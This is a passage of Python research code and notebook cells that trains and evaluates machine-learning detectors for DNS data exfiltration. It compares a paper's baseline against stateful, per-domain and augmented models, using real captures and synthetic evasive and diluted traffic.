    pf.run([syn_dir], out_dir=work / "syn", window=cfg["window"], scenario="synthetic", verbose=False)
    S = pd.read_csv(work / "syn" / "queries.csv", low_memory=False)
    side = pd.concat([pd.read_csv(p).assign(file=Path(p).name.replace(".labels.csv", ".pcap"))
                      for p in glob.glob(str(syn_dir / "**" / "*.labels.csv"), recursive=True)])
    S = S.drop(columns=["label"]).merge(side[["file", "pkt_index", "label", "family"]], on=["file", "pkt_index"], how="left")
    if S.label.isna().any():
        raise RuntimeError("synthetic queries without a label")
    S["label"] = S.label.astype(int)
    S = S.merge(man[["file", "kind", "family", "rate"]].rename(columns={"family": "stream_family"}), on="file")
    S = S.sort_values(["file", "ts"]).reset_index(drop=True)
    spos = S.groupby("file").cumcount() / S.groupby("file")["ts"].transform("size")
    S["role"] = np.select([S.kind == "evasive", (S.kind == "hard_benign") & (spos < 0.5), S.kind == "hard_benign",
                           S.kind == "train_mixed"], ["evasive", "hard_train", "hard_test", "mixed_train"], "mixed")
    S["enc"] = S.stream_family.map(lambda f: ev.FAMILIES[f][0] if f in ev.FAMILIES else "none")
    S["origin"] = "synthetic"
    S = S.drop(columns=["kind"])

    # ---- features
    ALL = pd.concat([Q, S], ignore_index=True, sort=False)
    ALL["sld_code"] = pd.factorize(ALL["sld"].fillna(""))[0]
    lm = train_bigram_lm(ALL[(ALL.role == "real_train") & (ALL.label == 0)].name.fillna(""))
    ALL = pd.concat([ALL, char_features(ALL, lm)], axis=1)
    if verbose:
        print(f"Computing stateful features for {len(ALL):,} queries ...")
    ALL = sf.add_stateful(ALL, host_n=cfg["window"], dom_seconds=cfg["dom_seconds"], keys=KEYS)
    ALL = sf.add_behaviour(ALL, long_seconds=cfg["long_seconds"], keys=KEYS)
    D = {"ALL": ALL, "manifest": man, "real_audit": real_audit, "cfg": cfg, "key": key}
    pd.to_pickle(D, cache)
    if not keep_synthetic:
        shutil.rmtree(syn_dir, ignore_errors=True)
        shutil.rmtree(work / "syn", ignore_errors=True)
    if verbose:
        print(f"[OK] prepared {len(ALL):,} queries in {time.time() - t0:.0f}s")
        print(ALL.groupby(["origin", "role"]).label.agg(queries="size", exfil="sum").to_string())
    return D


# --------------------------------------------------------------------------- models
def make_model(name, cfg):
    seed = cfg["seed"]
    m = {"RF": RandomForestClassifier(n_estimators=cfg["n_estimators"], n_jobs=-1, random_state=seed),
         "GNB": GaussianNB(),
         "LR": LogisticRegression(max_iter=1000, random_state=seed),
         "MLP": MLPClassifier(max_iter=300, random_state=seed),
         "SVM": SVC(random_state=seed)}[name]
    return make_pipeline(StandardScaler(), m) if name in ("LR", "MLP", "SVM") else m


def fit(name, X, y, cfg):
    if name == "SVM" and len(X) > cfg["svm_max_train"]:
        i = np.random.default_rng(cfg["seed"]).choice(len(X), cfg["svm_max_train"], replace=False)
        X, y = X.iloc[i], y.iloc[i]
    return make_model(name, cfg).fit(X, y)


def _test(A):
    return A[A.role.isin(TEST_ROLES)]


def _single(D, features, model="RF"):
    A, cfg = D["ALL"], D["cfg"]
    tr = A[A.role == "real_train"]
    m = fit(model, tr[features], tr.label, cfg)
    t = _test(A)
    return pd.Series(m.predict(t[features]).astype(float), index=t.index), {"model": m, "features": features}


def paper_window_rule(D, pred):
    """Paper Sec. 5: flag a whole window of `window` queries when > delta of them are flagged."""
    A, cfg = D["ALL"], D["cfg"]
    t = A.loc[pred.index, KEYS + ["ts"]].assign(p=pred.values).sort_values(KEYS + ["ts"])
    t["win"] = t.groupby(KEYS).cumcount() // cfg["window"]
    flag = t.groupby(KEYS + ["win"])["p"].transform("mean") > cfg["paper_delta"]
    return flag.astype(float).reindex(pred.index)


def _loeo(D, train_and_predict):
    """Leave-one-encoding-out: fold e trains without encoding e; held-out rows take their fold's score,
    rows of no encoding take the mean over folds."""
    A = D["ALL"]
    t = _test(A)
    out = pd.Series(0.0, index=t.index)
    neutral = ~t.enc.isin(ENCODINGS)
    infos = {}
    for e in ENCODINGS:
        train_mask = A.role.isin(["real_train", "hard_train"]) | (A.role.isin(["evasive", "mixed_train"]) & (A.enc != e))
        p, info = train_and_predict(A, train_mask, t)
        own = t.enc == e
        out[own] = p[own]
        out[neutral] += p[neutral] / len(ENCODINGS)
        infos[e] = info
    return out, infos


def step3a(D):
    cfg, F = D["cfg"], FEATURES["step2"]

    def tp(A, mask, t):
        m = fit("RF", A.loc[mask, F], A.loc[mask, "label"], cfg)
        return pd.Series(m.predict(t[F]).astype(float), index=t.index), {"model": m, "features": F}
    return _loeo(D, tp)


def step3b(D):
    cfg = D["cfg"]
    F1, F2 = FEATURES["step3_layer1"], FEATURES["step3_layer2"]

    def tp(A, mask, t):
        l1 = make_model("RF", cfg)
        tr = A[mask]
        cv = StratifiedKFold(3, shuffle=True, random_state=cfg["seed"])
        oof = cross_val_predict(l1, tr[F1], tr.label, cv=cv, method="predict_proba")[:, 1]
        l1.fit(tr[F1], tr.label)
        score = pd.Series(l1.predict_proba(A[F1])[:, 1], index=A.index)
        score[mask] = oof                                           # out-of-fold for training rows
        A2 = sf.add_rolling_scores(A[KEYS + ["ts", "base"]].assign(l1_score=score.values), "l1_score",
                                   host_n=cfg["window"], dom_seconds=cfg["dom_seconds"], keys=KEYS)
        X = pd.concat([A[FEATURES["step2"]], A2[["l1_score"] + sf.SCORE_FEATURES]], axis=1)
        l2 = fit("RF", X.loc[mask, F2], A.loc[mask, "label"], cfg)
        return pd.Series(l2.predict(X.loc[t.index, F2]).astype(float), index=t.index), \
            {"model": l2, "features": F2, "layer1": l1}
    return _loeo(D, tp)


def step4_behaviour(D):
    cfg, F = D["cfg"], FEATURES["step4_behaviour"]
    use_trunc = cfg.get("behaviour_on_trunc", False)

    def tp(A, mask, t):
        if not use_trunc:                                        # train only where the domain is known
            mask = mask & (A.base != "<trunc>")
        m = fit("RF", A.loc[mask, F], A.loc[mask, "label"], cfg)
        p = pd.Series(m.predict(t[F]).astype(float), index=t.index)
        if not use_trunc:
            p[(t.base == "<trunc>").values] = 0.0                # abstain: leave these to step 3a
        return p, {"model": m, "features": F}
    return _loeo(D, tp)


DETECTORS = {
    "baseline": lambda D, model="RF": _single(D, FEATURES["baseline"], model),
    "step1": lambda D: _single(D, FEATURES["step1"]),
    "step2": lambda D: _single(D, FEATURES["step2"]),
    "step3a": step3a,
    "step3b": step3b,
    "step4 behaviour": step4_behaviour,
}
DESCRIPTION = {
    "baseline": "paper's 14 stateless features, real data only",
    "baseline+window": "baseline RF + paper window rule (>40% of 100 queries)",
    "step1": "+ host temporal features",
    "step2": "+ per-domain statistical features",
    "step3a": "step2 + augmented training (leave-one-encoding-out)",
    "step3b": "two-layer: char model -> score aggregates + step2, augmented",
    "step4 behaviour": "behaviour-only model (no character features), augmented; abstains on cut-off names",
    "step4": "step3a OR step4 behaviour",
}


def run_detectors(D, steps, baseline_models=("RF",), verbose=True):
    """steps: subset of ['baseline', 'step1', 'step2', 'step3a', 'step3b', 'step4'] (baseline always adds the
    paper window rule; step4 also reports its behaviour-only model). Returns (preds, infos)."""
    preds, infos = {}, {}
    for s in steps:
        t0 = time.time()
        if s == "baseline":
            for m in baseline_models:
                name = "baseline" if m == "RF" else f"baseline ({m})"
                preds[name], infos[name] = DETECTORS["baseline"](D, m)
            if "RF" in baseline_models:
                preds["baseline+window"] = paper_window_rule(D, preds["baseline"])
                infos["baseline+window"] = infos["baseline"]
        elif s == "step4":
            for part in ("step3a", "step4 behaviour"):
                if part not in preds:
                    preds[part], infos[part] = DETECTORS[part](D)
            preds["step4"] = np.maximum(preds["step3a"], preds["step4 behaviour"])
            infos["step4"] = infos["step4 behaviour"]
        else:
            preds[s], infos[s] = DETECTORS[s](D)
        if verbose:
            print(f"  {s:10s} done in {time.time() - t0:5.0f}s")
    return preds, infos


# --------------------------------------------------------------------------- metrics
def _rates(y, p):
    y, p = np.asarray(y, float), np.asarray(p, float)
    tp, fp = (p * y).sum(), (p * (1 - y)).sum()
    fn, tn = ((1 - p) * y).sum(), ((1 - p) * (1 - y)).sum()
    rec = tp / (tp + fn) if tp + fn else np.nan
    fpr = fp / (fp + tn) if fp + tn else np.nan
    prec = tp / (tp + fp) if tp + fp else np.nan
    f1 = 2 * prec * rec / (prec + rec) if prec and rec and not (math.isnan(prec) or math.isnan(rec)) else 0.0
    return rec, fpr, f1


def evaluate(D, preds):
    """-> (summary: one row per detector, detail: recall per family / dilution rate)."""
    A, cfg = D["ALL"], D["cfg"]
    rows, detail = [], []
    for name, p in preds.items():
        t = A.loc[p.index].assign(p=p.values)
        r = {"detector": name, "what": DESCRIPTION.get(name.split(" (")[0], name)}
        rt = t[t.role == "real_test"]
        rec, fpr, f1 = _rates(rt.label, rt.p)
        r.update(real_f1=100 * f1, real_recall=100 * rec, real_fpr=100 * fpr)
        evs = t[t.role == "evasive"]
        fam_rec = evs.groupby("stream_family").p.mean() * 100
        for f, v in fam_rec.items():
            detail.append(dict(detector=name, test="evasive (pure stream)", family=f, encoding=ev.FAMILIES[f][0], value=v))
        r["evasive_recall"] = fam_rec.mean()
        for e in ENCODINGS:
            fs = [f for f in fam_rec.index if ev.FAMILIES[f][0] == e]
            r[f"evasive_{e}"] = fam_rec[fs].mean() if fs else np.nan
        r["hard_fpr"] = 100 * t[t.role == "hard_test"].p.mean()
        mx = t[t.role == "mixed"]
        for rate in cfg["mixed_rates"]:
            g = mx[(mx.rate == rate) & (mx.label == 1)].groupby("stream_family").p.mean() * 100
            r[f"mixed_recall_{int(round(rate * 100))}%"] = g.mean()
            for f, v in g.items():
                detail.append(dict(detector=name, test=f"mixed {int(round(rate * 100))}%", family=f,
                                   encoding=ev.FAMILIES[f][0], value=v))
        r["mixed_fpr"] = 100 * mx[mx.label == 0].p.mean()
        rows.append(r)
    return pd.DataFrame(rows), pd.DataFrame(detail)


KEY_COLUMNS = ["detector", "real_f1", "real_fpr", "evasive_recall", "evasive_base32", "evasive_hex", "evasive_base64",
               "evasive_words", "hard_fpr", "mixed_recall_1%", "mixed_recall_5%", "mixed_recall_20%",
               "mixed_recall_50%", "mixed_fpr"]


def key_table(summary):
    return summary[[c for c in KEY_COLUMNS if c in summary.columns]].set_index("detector").round(2)


def delta_vs(summary, ref="baseline"):
    k = key_table(summary)
    return (k - k.loc[ref]).drop(index=ref).round(2) if ref in k.index else k


def feature_importance(info, top=15):
    if isinstance(info, dict) and "model" not in info:           # leave-one-encoding-out: average folds
        imps = [pd.Series(i["model"].feature_importances_, index=i["features"]) for i in info.values()]
        return pd.concat(imps, axis=1).mean(axis=1).sort_values(ascending=False).head(top).round(4)
    m = info["model"]
    m = m[-1] if hasattr(m, "steps") else m
    if not hasattr(m, "feature_importances_"):
        return pd.Series(dtype=float)
    return pd.Series(m.feature_importances_, index=info["features"]).sort_values(ascending=False).head(top).round(4)


def run_seeds(inputs, work_dir, seeds=(1, 2, 3, 4, 5), steps=("baseline", "step1", "step2", "step3a", "step3b", "step4"),
              cfg=None, verbose=True):
    """Repeat prepare -> run_detectors -> evaluate for several seeds. Each seed draws new synthetic traffic
    (payloads, attacker domains, background, timing) and new model randomness; the real split is fixed.
    Returns (summaries, details) with a `seed` column."""
    sums, dets = [], []
    for s in seeds:
        t0 = time.time()
        D = prepare(inputs, Path(work_dir) / f"seed_{s}", {**(cfg or {}), "seed": s}, verbose=False,
                    keep_synthetic=False)
        preds, _ = run_detectors(D, list(steps), verbose=False)
        summ, det = evaluate(D, preds)
        sums.append(summ.assign(seed=s))
        dets.append(det.assign(seed=s))
        if verbose:
            k = key_table(summ)
            print(f"seed {s}: {len(D['ALL']):,} queries, {time.time() - t0:.0f}s | diluted recall 1/5/20/50% "
                  + " | ".join(f"{d}: " + "/".join(f"{k.loc[d, c]:.0f}" for c in KEY_COLUMNS[9:13]) for d in k.index))
        del D
    return pd.concat(sums, ignore_index=True), pd.concat(dets, ignore_index=True)


def aggregate(summaries):
    """-> (mean, std, display table 'mean ± std') per detector over seeds, detectors in run order."""
    cols = [c for c in KEY_COLUMNS[1:] if c in summaries.columns]
    order = list(dict.fromkeys(summaries.detector))
    g = summaries.groupby("detector")[cols]
    mean, std = g.mean().reindex(order), g.std(ddof=1).reindex(order).fillna(0)
    table = mean.round(1).astype(str) + " ± " + std.round(1).astype(str)
    return mean, std, table


def save(out_dir, summary, detail, D, extra=None):
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    summary.to_csv(out / "summary.csv", index=False)
    detail.to_csv(out / "detail.csv", index=False)
    D["manifest"].to_csv(out / "synthetic_manifest.csv", index=False)
    D["real_audit"].to_csv(out / "real_label_audit.csv", index=False)
    cfg = {k: (list(v) if isinstance(v, tuple) else v) for k, v in D["cfg"].items()}
    (out / "run_config.json").write_text(json.dumps({"config": cfg, "features": FEATURES, **(extra or {})},
                                                    indent=2, default=str))
    return out

## 2. Data: real PCAPs + synthetic test traffic

In [ ]:
work = Path(CONFIG["work_dir"]); work.mkdir(parents=True, exist_ok=True)
if CONFIG["data_source"] == "upload":
    from google.colab import files
    inputs = []
    for fname, blob in files.upload().items():
        p = work / "uploads" / fname; p.parent.mkdir(parents=True, exist_ok=True); p.write_bytes(blob); inputs.append(str(p))
elif CONFIG["data_source"] == "drive":
    from google.colab import drive
    drive.mount("/content/drive"); inputs = [CONFIG["drive_path"]]
else:
    inputs = CONFIG["local_paths"]
inputs = [i for i in inputs if Path(i).exists()]
assert inputs, "No PCAP input found - check CONFIG"
print("Inputs:", inputs)

sys.path.insert(0, os.getcwd())
import importlib
import pcap_features, evasion_data, stateful_features, experiment as ex
for m in (pcap_features, evasion_data, stateful_features, ex):
    importlib.reload(m)
D = ex.prepare(inputs, work, CONFIG["experiment"])

In [ ]:
print("Real captures - label audit (long_msg_not_labelled and rule_hits_in_benign_file must be 0):")
display(D["real_audit"])
print("Synthetic captures:")
display(D["manifest"].groupby("kind")[["queries", "exfil"]].sum())

## 3. Train and evaluate

In [ ]:
preds, infos = ex.run_detectors(D, CONFIG["steps"], baseline_models=CONFIG["baseline_models"])
summary, detail = ex.evaluate(D, preds)
print("Key metrics (%). Rows = metrics, columns = models.")
display(ex.key_table(summary).T)

In [ ]:
print("Recall (%) per family: pure evasive streams and mixed streams")
display(detail.pivot_table(index=["test", "family"], columns="detector", values="value").round(1))

In [ ]:
focus = "baseline"
print(f"Top features of '{focus}' (Random Forest importance):")
display(ex.feature_importance(infos[focus]).to_frame("importance"))

## 4. Save

In [ ]:
out = ex.save(CONFIG["output_dir"], summary, detail, D, extra={"notebook": NOTEBOOK, "steps": CONFIG["steps"]})
print("Saved to", out)
for f in sorted(out.iterdir()):
    print(f"  {f.name:28s} {f.stat().st_size / 1e3:8.1f} KB")
if IN_COLAB:
    shutil.make_archive(f"/content/{NOTEBOOK}_results", "zip", out)
    from google.colab import files
    files.download(f"/content/{NOTEBOOK}_results.zip")

## 5. How to read this

- **real test** near 100% reproduces the paper's result once the exfiltration is actually in the data.
- **evasive / mixed** recall is the weakness the next steps target. The window rule (`baseline+window`) cannot help a diluted attack: at 1-20% dilution a window never reaches 40% flagged queries.